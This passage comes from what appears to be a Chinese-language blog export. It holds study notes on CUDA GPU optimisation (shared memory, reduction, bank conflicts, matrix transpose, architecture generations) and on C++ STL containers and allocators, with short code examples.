Nd, P, TILE_WIDTH);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拷贝结果，释放内存</span></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(P, Pd, size, cudaMemcpyDeviceToHost);</span><br><span class="line">    <span class="built_in">cudaFree</span>(Md);</span><br><span class="line">    <span class="built_in">cudaFree</span>(Nd);</span><br><span class="line">    <span class="built_in">cudaFree</span>(Pd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于我们定义TILE_WIDTH为16，因此global memory的访存次数减少16倍。因为：</p>
<p>假设有两个16 * 16矩阵M，N相乘，则访存次数为16 * 16 * 32次，因为计算1个元素需要读取M的一行与N的一列，即32个元素参与计算，访存32次。</p>
<p>当使用shared memory后，我们访问global memory的次数为16 * 16 * 2次，也就是将2个16 * 16的矩阵复制到shared memory所需要的次数。</p>
<p>定义TILE_WIDTH大小应当根据：</p>
<ul>
<li>每个block所能容纳的线程数目；</li>
<li>每个thread可以分配的Local Memory的大小；</li>
<li>每个thread可以分配的Registry的数量；</li>
</ul>
<h3 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h3><p>原子操作是耗时的，尽量少用原子操作。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 算术操作</span></span><br><span class="line"><span class="built_in">atomicAdd</span>()</span><br><span class="line"><span class="built_in">atomicSub</span>()</span><br><span class="line"><span class="built_in">atomicExch</span>()</span><br><span class="line"><span class="built_in">atomicMin</span>()</span><br><span class="line"><span class="built_in">atomicMax</span>()</span><br><span class="line"><span class="built_in">atomicDec</span>()</span><br><span class="line"><span class="built_in">atomicCAS</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 位运算</span></span><br><span class="line"><span class="built_in">atomicAnd</span>()</span><br><span class="line"><span class="built_in">atomicOr</span>()</span><br><span class="line"><span class="built_in">atomicXor</span>()</span><br></pre></td></tr></table></figure>

<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>使用Nsight可以调试：</p>
<p>Linux下可以使用命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nsight</span><br></pre></td></tr></table></figure>

<p>打开Eclipse，编写一个CUDA程序。在设备代码中打入断点，Debug时即可在CUDA选项中查看变量的值，左侧可以选择CUDA线程。</p>
<p>提示：如果设备正在用于图像显示，则不能进行调试。</p>
<p>Nsight也可以进行性能分析，可以在Profiler中查看。</p>
<p>如果仅有一块GPU卡，需要先停止桌面环境，仅仅可以使用命令行调试，或从其他系统上通过Nsight远程调试。</p>
<h3 id="程序优化"><a href="#程序优化" class="headerlink" title="程序优化"></a>程序优化</h3><p>并行规约：例如有8个数据要求和，可以进行两两求和得到4个数据，再经过多次两两求和最终合并为1个数据。</p>
<p>合并的方式有两种，一种是：<br>第一轮：<code>A[0] = A[0] + A[1]</code>，<code>A[2] = A[2] + A[3]</code>，<code>A[4] = A[4] + A[5]</code>，<code>A[6] = A[6] + A[7]</code>；<br>第二轮：<code>A[0] = A[0] + A[2]</code>，<code>A[4] = A[4] + A[6]</code>；<br>第三轮：<code>A[0] = A[0] + A[4]</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">SumOnDevice</span><span class="params">(<span class="type">float</span> A[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __shared__ <span class="type">float</span> partialSum[];</span><br><span class="line">    <span class="comment">// 载入数据到shared memory</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> k = <span class="number">0</span>; k &lt; blockDim.x; k++)&#123;</span><br><span class="line">        partialSum[k] = A[k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 求和</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> t = threadIdx.x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> stride = <span class="number">1</span>; stride &lt; blockDim.x; stride *= <span class="number">2</span>)&#123;</span><br><span class="line">        __syncthreads();</span><br><span class="line">        <span class="keyword">if</span>(t % (<span class="number">2</span> * stride) == <span class="number">0</span>)&#123;</span><br><span class="line">            partialSum[t] += partialSum[t + stride];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另一种是：<br>第一轮：<code>A[0] = A[0] + A[4]</code>，<code>A[1] = A[1] + A[5]</code>，<code>A[2] = A[2] + A[6]</code>，<code>A[3] = A[3] + A[7]</code>；<br>第二轮：<code>A[0] = A[0] + A[2]</code>，<code>A[1] = A[1] + A[3]</code>；<br>第三轮：<code>A[0] = A[0] + A[1]</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">SumOnDevice</span><span class="params">(<span class="type">float</span> A[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __shared__ <span class="type">float</span> partialSum[];</span><br><span class="line">    <span class="comment">// 载入数据到shared memory</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> k = <span class="number">0</span>; k &lt; blockDim.x; k++)&#123;</span><br><span class="line">        partialSum[k] = A[k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 求和</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> t = threadIdx.x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> stride = blockDim.x / <span class="number">2</span>; stride &gt; <span class="number">0</span>; stride /= <span class="number">2</span>)&#123;</span><br><span class="line">        __syncthreads();</span><br><span class="line">        <span class="keyword">if</span>(stride &gt; t)&#123;</span><br><span class="line">            partialSum[t] += partialSum[t + stride];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两种方法是有区别的：</p>
<p>前者在进行第二轮运算时，会屏蔽1，3，5，7号线程，第三轮屏蔽1，2，3，5，6，7号线程，而留下1号与4号线程。这样就会使得每个wrap都被占用，但都只利用其中一小部分资源，从而造成资源的浪费。</p>
<p>后者则在第二轮减半后释放后面的4个线程，只留下前面的4个线程，可以减少占用的wrap数，而正在使用的wrap也得到了充分利用。</p>
<p>因此，我们在编写程序时，应当注意利用thread index与wrap的关系，合理的使用wrap。</p>
<p>thread index与wrap的关系，就是wrap 0对应0<del>31号线程；wrap 1对应32</del>63号线程……以此类推。</p>
<h3 id="存储优化"><a href="#存储优化" class="headerlink" title="存储优化"></a>存储优化</h3><h4 id="global-memory"><a href="#global-memory" class="headerlink" title="global memory"></a>global memory</h4><p>CPU与GPU数据传输应当减少传输，组团传输。应注意：</p>
<ul>
<li>中间数据直接在GPU上分配与释放；</li>
<li>GPU上更适合进行重复计算；</li>
<li>如果没有减少数据传输，将CPU的的代码移植到GPU上也可能无法提示性能；</li>
<li>大块传输要优于小块传输；</li>
<li>采用双缓存同时计算与传输。</li>
</ul>
<p>global memory的延迟很长，可以通过编译指令绕过一级缓存L1，只缓存于二级缓存L2。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-Xptxas - dlcm=cg</span><br></pre></td></tr></table></figure>

<p>如果wrap的读写请求落到L1 cache line，则只需一次传输。因此应当使用合并原则，即使用连续的32字节块，对应一个wrap去处理，每个线程访问其中的1个字节。</p>
<p>另外，也尽量避免单个线程访问连续的字节块。</p>
<h4 id="shared-memory"><a href="#shared-memory" class="headerlink" title="shared memory"></a>shared memory</h4><p>shared memory的访问速度比global memory速度快上百倍，因此也可以使用shared memory缓存数据，再进行不规则访问。</p>
<p>shared memory被分为了许多banks（多体低位交叉存储），具备如下特性：</p>
<ul>
<li>连续的32bit（4字节）访存会被分配到连续的banks中；</li>
<li>每个bank每周期可相应一个地址；</li>
<li>多个bank也可以在同一个周期相应多个地址申请；</li>
<li>如果对同一bank进行多次并发访存将导致bank冲突。</li>
</ul>
<p>在没有bank冲突的情况下，share memory的存取速度几乎和register一样快。对于分析是否含有bank冲突，可以使用profiler分析器查看。</p>
<p>没有冲突的情况：</p>
<ul>
<li>half-wrap内所有线程访问不同banks；</li>
<li>half-wrap内所有线程读取同一地址。</li>
</ul>
<p>产生冲突的情况：</p>
<ul>
<li>half-wrap内多个线程访问同一个bank；</li>
<li>访存串行化。</li>
</ul>
<h4 id="矩阵转置"><a href="#矩阵转置" class="headerlink" title="矩阵转置"></a>矩阵转置</h4><p>在矩阵转置中，不论是按行读按列写，还是按列读按行写，总有情况是访存不合并的。但是我们期望读写都是访存合并的。</p>
<p>这个问题可以通过shared memory解决。首先将小块数据由global memory读入shared memory，转置后再以连续化的数据写入global memory。这一过程中需要注意同步线程。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">transposeCoalesced</span><span class="params">(<span class="type">float</span> *odata, <span class="type">float</span> *idata, <span class="type">int</span> width, <span class="type">int</span> height)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __shared__ <span class="type">float</span> tile[TILE_DIM][TILE_DIM];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> xIndex = blockIdx.x * TILE_DIM + threadIdx.x;</span><br><span class="line">    <span class="type">int</span> yIndex = blockIdx.y * TILE_DIM + threadIdx.y;</span><br><span class="line">    <span class="type">int</span> index_in = xIndex + yIndex * width;</span><br><span class="line"></span><br><span class="line">    xIndex = blockIdx.y * TILE_DIM + threadIdx.x;</span><br><span class="line">    yIndex = blockIdx.x * TILE_DIM + threadIdx.y;</span><br><span class="line">    <span class="type">int</span> index_out = xIndex + yIndex * height;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面会产生bank冲突</span></span><br><span class="line">    tile[threadIdx.y][threadIdx.x] = idata[index_in];</span><br><span class="line">    __syncthreads();</span><br><span class="line">    odata[index_out] = tile[threadIdx.x][threadIdx.y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于这种方法会产生bank冲突，因此需要优化：<code>tile[TILE_DIM][TILE_DIM]</code>改为<code>tile[TILE_DIM][TILE_DIM + 1]</code>，也就是多一组用于占位，这样就不会连续多次访问同一个bank。</p>
<h4 id="texure-memory"><a href="#texure-memory" class="headerlink" title="texure memory"></a>texure memory</h4><p>texure memory对于GPU来说是一个只读存储器，其优势在于可以适应无法合并访存的场合，支持数据过滤输出（如：线性，双线性，三线性插值；由专用硬件完成），支持多维寻址，支持整数和小数作为坐标寻址，支持越界寻址。这些特征非常适用于对图像的处理。</p>
<h3 id="SM-资源分割"><a href="#SM-资源分割" class="headerlink" title="SM 资源分割"></a>SM 资源分割</h3><p>SM上的资源是有限的，主要包含如下几类资源：</p>
<ul>
<li>threads block slots：block 的最大值也受限制</li>
<li>threads slots</li>
<li>registers</li>
<li>shared memory</li>
</ul>
<p>资源占用可以使用相应的计算器计算，<code>CUDA GPU Occupancy Calculator</code>。</p>
<h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><p>有时为了更好的性能，可以将循环展开：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)&#123;</span><br><span class="line">    Sum += A[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 改为</span></span><br><span class="line">Sum += A[<span class="number">0</span>] + A[<span class="number">2</span>] + A[<span class="number">3</span>] + A[<span class="number">4</span>] + A[<span class="number">5</span>] + A[<span class="number">6</span>] ...</span><br></pre></td></tr></table></figure>

<p>这一过程可以由编译器自动实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#pramga unroll BLOCK_SIZE</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; BLOCK_SIZE; i++)&#123;</span><br><span class="line">    Sum += A[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#pramga</span></span><br></pre></td></tr></table></figure>


<h2 id="GPU-架构系列"><a href="#GPU-架构系列" class="headerlink" title="GPU 架构系列"></a>GPU 架构系列</h2><p>系列命名：Tesla，Fermi，Kepler，Maxwell，Pascal，Volta，Turing，Ampere</p>
<h3 id="系列对比"><a href="#系列对比" class="headerlink" title="系列对比"></a>系列对比</h3><img src="/2020/02/14/C/CUDA/comp_1.png" class="" title="对比图1">

<img src="/2020/02/14/C/CUDA/comp_2.png" class="" title="对比图2">




<h3 id="Fermi-架构"><a href="#Fermi-架构" class="headerlink" title="Fermi 架构"></a>Fermi 架构</h3><p>Fermi是第一个完整的GPU计算架构，参考配置：</p>
<ul>
<li>16个SM，每个SM包含32个CUDA Core；</li>
<li>每个CUDA Core包含1个ALU和1个FPU；</li>
<li>6个384位GDDR5 DRAM，支持6GB global memory；</li>
<li>768KB L2 Cache。</li>
</ul>
<p>Fermi架构的部分显卡：GTX 480；GTX 470，GTX 465，GF 100等。</p>
<h3 id="Kepler-架构"><a href="#Kepler-架构" class="headerlink" title="Kepler 架构"></a>Kepler 架构</h3><p>显卡：GTX600&#x2F;600M系列和GTX700&#x2F;700M系列。</p>
<p>特性：</p>
<ul>
<li>Dynamic Parallelism：允许GPU动态的启动新的Grid。有了这个特性，任何kernel内都可以启动其它的kernel了。</li>
<li>Hyper-Q： 允许多个CPU核同时在单一GPU上启动线程，从而大大提高了GPU的利用率并削减了CPU空闲时间。</li>
<li>GPUDirect：能够使单个计算机内的GPU或位于网络内不同服务器内的GPU直接交换数据，无需进入CPU系统内存。</li>
<li>Grid Management Unit：能够使用先进、灵活的GRID管理和调度控制系统。</li>
</ul>
<h3 id="Maxwell-架构"><a href="#Maxwell-架构" class="headerlink" title="Maxwell 架构"></a>Maxwell 架构</h3><p>显卡：GTX800&#x2F;800M系列与GTX750和GTX750TI。</p>
<p>特性：加入了新的G-SYNC（垂直同步）技术。</p>
<h3 id="Pascal-架构"><a href="#Pascal-架构" class="headerlink" title="Pascal 架构"></a>Pascal 架构</h3><p>显卡：</p>
<ul>
<li>GeForce系列：GTX1050、1050Ti、1060(3G, 5G, 6G)、1070、1070Ti、1080、1080Ti等；</li>
<li>QUADRO系列：GP100、P6000、P5000、P4000、P2000、P1000、P600、P400等；</li>
<li>特斯拉系列：P100、P4、P40；</li>
<li>TITAN XP。</li>
</ul>
<h2 id="CUDA-API"><a href="#CUDA-API" class="headerlink" title="CUDA API"></a>CUDA API</h2><p>API：</p>
<div class="pdf-container" data-target="./CUDA.pdf" data-height="500px"></div>































]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>CUDA</tag>
        <tag>Nvidia</tag>
        <tag>并行计算</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ STL</title>
    <url>/2020/09/13/C/STL/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h2 id="六大部件"><a href="#六大部件" class="headerlink" title="六大部件"></a>六大部件</h2><p>容器：占用内存，存放数据</p>
<p>分配器：为容器分配内存，管理内存</p>
<p>算法：关于容器的通用算法</p>
<p>迭代器：算法访问容器的桥梁</p>
<p>适配器：迭代器，容器，仿函数适配器，对他们做转换</p>
<p>仿函数：给自定义类准备的基本方法</p>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; vec&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator iter = vec.<span class="built_in">begin</span>();</span><br><span class="line"><span class="comment">// vec.end() 指向最后一个元素的下一个位置</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> item : vec)&#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span>&amp; item : vec)&#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> item : &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;)&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="OOP-vs-GP"><a href="#OOP-vs-GP" class="headerlink" title="OOP vs GP"></a>OOP vs GP</h2><p>OOP，面向对象编程，将数据和相应方法捆绑在一起。<br>GP，将数据和方法尽量分开。</p>
<h2 id="容器分类"><a href="#容器分类" class="headerlink" title="容器分类"></a>容器分类</h2><h3 id="序列容器"><a href="#序列容器" class="headerlink" title="序列容器"></a>序列容器</h3><p>Array 不可扩充的数组</p>
<p>Vector 单向扩充数组</p>
<p>Deque 双向扩充数组</p>
<p>List 双向循环链表</p>
<p>Forward-List 单链表</p>
<p>Slist 非标准 等同于FList <code>&lt;ext\slist&gt;</code></p>
<p>Priority Queue 优先队列，底层是堆</p>
<p>Heap 堆</p>
<p>Stack 栈</p>
<p>Queue 队列</p>
<h3 id="关联容器"><a href="#关联容器" class="headerlink" title="关联容器"></a>关联容器</h3><p>Set 、Multiset 集合</p>
<p>Map 、Multimap 映射</p>
<p>二者都是红黑树，适用于大量查找。</p>
<h3 id="无序容器"><a href="#无序容器" class="headerlink" title="无序容器"></a>无序容器</h3><p>Unordered Set 集合</p>
<p>Unordered Map 映射</p>
<p>使用哈希表实现。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">std::array&lt;<span class="type">int</span>, 5&gt; arr&#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; vec&#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">std::list&lt;<span class="type">int</span>&gt; li&#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">__gnu_cxx::slist&lt;<span class="type">int</span>&gt; sl&#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">std::deque&lt;<span class="type">int</span>&gt;;</span><br><span class="line">std::stack&lt;<span class="type">int</span>&gt;;</span><br><span class="line">std::queue&lt;<span class="type">int</span>&gt;;</span><br><span class="line">std::multiset&lt;string&gt;;</span><br><span class="line">std::multimap&lt;string, string&gt;;</span><br><span class="line">std::unordered_multiset&lt;string&gt;;</span><br><span class="line">std::unordered_multimap&lt;string, string&gt;;</span><br><span class="line">std::set&lt;string&gt;;</span><br><span class="line">std::map&lt;string, string&gt;;</span><br><span class="line">std::hash_set;</span><br><span class="line">std::hash_set;</span><br><span class="line">std::hash_multiset;</span><br><span class="line">std::hash_multimap;</span><br></pre></td></tr></table></figure>

<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h3><p>没有构造和析构函数。没有用malloc。模拟了原生的数组。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">array&lt;<span class="type">int</span>, ARRAY_SIZE&gt; arr;</span><br><span class="line">arr.<span class="built_in">size</span>();</span><br><span class="line">arr.<span class="built_in">front</span>();</span><br><span class="line">arr.<span class="built_in">back</span>();</span><br><span class="line">arr.<span class="built_in">data</span>();  <span class="comment">// 数组内存地址</span></span><br></pre></td></tr></table></figure>

<h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><p>不能原地扩充，必须复制。<br>容量不足时，将2倍扩充。<br>包含3个指针：数据开始，数据结尾，存储空间结尾。<br>由于扩充时进行了拷贝，因此<strong>会大量调用拷贝构造函数和析构函数</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">vec.<span class="built_in">size</span>();</span><br><span class="line">vec.<span class="built_in">front</span>();</span><br><span class="line">vec.<span class="built_in">back</span>();</span><br><span class="line">vec.<span class="built_in">data</span>();</span><br><span class="line">vec.<span class="built_in">capacity</span>();  <span class="comment">// 扩充前容量</span></span><br><span class="line">vec.<span class="built_in">push_back</span>();</span><br></pre></td></tr></table></figure>

<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>使用<code>双向链表迭代器</code>，底层是双向链表。双向链表中有一个空结点（end指向）。<br>GNU2.9中，内部包含一个结点指针，结点中包含前后结点的指针。<br>GNU4.9中，改为更复杂的机制，List基类包含2个指针，子类继承后加入结点数据。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">list&lt;<span class="type">int</span>&gt; li;</span><br><span class="line">li.<span class="built_in">size</span>();</span><br><span class="line">li.<span class="built_in">max_size</span>();</span><br><span class="line">li.<span class="built_in">front</span>();</span><br><span class="line">li.<span class="built_in">back</span>();</span><br><span class="line">li.<span class="built_in">sort</span>();  <span class="comment">// 自己有sort，就用自己的</span></span><br></pre></td></tr></table></figure>

<h3 id="Deque"><a href="#Deque" class="headerlink" title="Deque"></a>Deque</h3><p>每次扩充一个buffer，存在map中。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">deque&lt;<span class="type">int</span>&gt; deq;</span><br><span class="line">deq.<span class="built_in">size</span>();</span><br><span class="line">deq.<span class="built_in">max_size</span>();</span><br><span class="line">deq.<span class="built_in">front</span>();</span><br><span class="line">deq.<span class="built_in">back</span>();</span><br></pre></td></tr></table></figure>

<h3 id="Forward-List"><a href="#Forward-List" class="headerlink" title="Forward-List"></a>Forward-List</h3><p>含有头节点。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">forward_list&lt;<span class="type">int</span>&gt; fl;</span><br><span class="line"><span class="comment">// fl.size();  // 没有</span></span><br><span class="line">fl.<span class="built_in">max_size</span>();</span><br><span class="line">fl.<span class="built_in">front</span>();</span><br><span class="line">fl.<span class="built_in">push_front</span>();  <span class="comment">// 没有push_back</span></span><br><span class="line"><span class="comment">// fl.back();   // 没有</span></span><br></pre></td></tr></table></figure>

<h3 id="SList"><a href="#SList" class="headerlink" title="SList"></a>SList</h3><p>等同于forward-list，是非标准库结构，但是被编译器实现。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ext/slist&gt;</span></span></span><br><span class="line">slist&lt;<span class="type">int</span>&gt; sl;</span><br></pre></td></tr></table></figure>

<h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>底层是 deque</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">st.<span class="built_in">size</span>();</span><br><span class="line">st.<span class="built_in">top</span>();</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line">st.<span class="built_in">push</span>();</span><br></pre></td></tr></table></figure>

<h3 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h3><p>底层是 deque</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">queue&lt;<span class="type">int</span>&gt; que;</span><br><span class="line">que.<span class="built_in">size</span>();</span><br><span class="line">que.<span class="built_in">front</span>();</span><br><span class="line">que.<span class="built_in">back</span>();</span><br><span class="line">que.<span class="built_in">pop</span>();</span><br><span class="line">que.<span class="built_in">push</span>();</span><br></pre></td></tr></table></figure>

<h3 id="Multiset"><a href="#Multiset" class="headerlink" title="Multiset"></a>Multiset</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">multiset&lt;<span class="type">int</span>&gt; ms;</span><br><span class="line">ms.<span class="built_in">size</span>();</span><br><span class="line">ms.<span class="built_in">max_size</span>();</span><br><span class="line">ms.<span class="built_in">insert</span>();</span><br><span class="line">ms.<span class="built_in">find</span>();</span><br></pre></td></tr></table></figure>

<h3 id="Multimap"><a href="#Multimap" class="headerlink" title="Multimap"></a>Multimap</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">multimap&lt;string, <span class="type">int</span>&gt; mm;</span><br><span class="line">mm.<span class="built_in">size</span>();</span><br><span class="line">mm.<span class="built_in">max_size</span>();</span><br><span class="line">mm.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;string, <span class="type">int</span>&gt;(<span class="string">&quot;1&quot;</span>, <span class="number">1</span>));</span><br><span class="line"><span class="keyword">auto</span> pItem = mm.<span class="built_in">find</span>(); <span class="comment">// 迭代器</span></span><br></pre></td></tr></table></figure>

<h3 id="Unordered-Multiset-C-11"><a href="#Unordered-Multiset-C-11" class="headerlink" title="Unordered Multiset C++11"></a>Unordered Multiset C++11</h3><p>底层为哈希表，篮子数比元素多</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">unordered_multiset&lt;<span class="type">int</span>&gt; ums;</span><br><span class="line">ums.<span class="built_in">size</span>();</span><br><span class="line">ums.<span class="built_in">max_size</span>();</span><br><span class="line">ums.<span class="built_in">bucket_count</span>();  <span class="comment">// 哈希表篮子数</span></span><br><span class="line">ums.<span class="built_in">bucket_size</span>(<span class="type">int</span> i);  <span class="comment">// 哈希表篮子链表节点数</span></span><br><span class="line">ums.<span class="built_in">load_factor</span>();   <span class="comment">// 载荷因子</span></span><br><span class="line">ums.<span class="built_in">max_bucket_count</span>();</span><br><span class="line">ums.<span class="built_in">max_load_factor</span>();</span><br><span class="line">ums.<span class="built_in">insert</span>();</span><br><span class="line">ums.<span class="built_in">find</span>();</span><br></pre></td></tr></table></figure>

<h3 id="Unordered-Multimap-C-11"><a href="#Unordered-Multimap-C-11" class="headerlink" title="Unordered Multimap C++11"></a>Unordered Multimap C++11</h3><p>底层为哈希表</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">unordered_multimap&lt;string, <span class="type">int</span>&gt; umm;</span><br><span class="line">umm.<span class="built_in">size</span>();</span><br><span class="line">umm.<span class="built_in">max_size</span>();</span><br><span class="line">umm.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;string, <span class="type">int</span>&gt;(<span class="string">&quot;1&quot;</span>, <span class="number">1</span>));</span><br><span class="line">umm.<span class="built_in">find</span>(); <span class="comment">// 迭代器</span></span><br></pre></td></tr></table></figure>

<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">map&lt;string, <span class="type">int</span>&gt; mp;</span><br><span class="line">mp[<span class="string">&quot;key&quot;</span>]=val;</span><br><span class="line">mp.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;string, <span class="type">int</span>&gt;(<span class="string">&quot;key&quot;</span>, val));</span><br></pre></td></tr></table></figure>

<h3 id="Unordered-Set"><a href="#Unordered-Set" class="headerlink" title="Unordered Set"></a>Unordered Set</h3><h3 id="Unordered-Map"><a href="#Unordered-Map" class="headerlink" title="Unordered Map"></a>Unordered Map</h3><h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 包含于 stdexcept</span></span><br><span class="line"><span class="keyword">try</span>&#123;&#125;</span><br><span class="line"><span class="built_in">catch</span>(exception &amp;e)&#123;e.<span class="built_in">what</span>();&#125;</span><br><span class="line"><span class="comment">// 包含于 stdlib</span></span><br><span class="line"><span class="built_in">abort</span>()</span><br></pre></td></tr></table></figure>

<h2 id="分配器-Allocator"><a href="#分配器-Allocator" class="headerlink" title="分配器 Allocator"></a>分配器 Allocator</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>头文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span>  <span class="comment">// 标准分配器 std::allocator</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ext\array_allocator.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ext\mt_allocator.h&gt;</span>    <span class="comment">// 多线程 分配器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ext\debug_allocator.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ext\pool_allocator.h&gt;</span>  <span class="comment">// 内存池 分配器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ext\bitmap_allocator.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ext\malloc_allocator.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ext\new_allocator.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">list&lt;string, __gnu_cxx::__pool_alloc&lt;string&gt;&gt; c;</span><br></pre></td></tr></table></figure>



<p>每个容器都有默认分配器，也可以自定义分配器。</p>
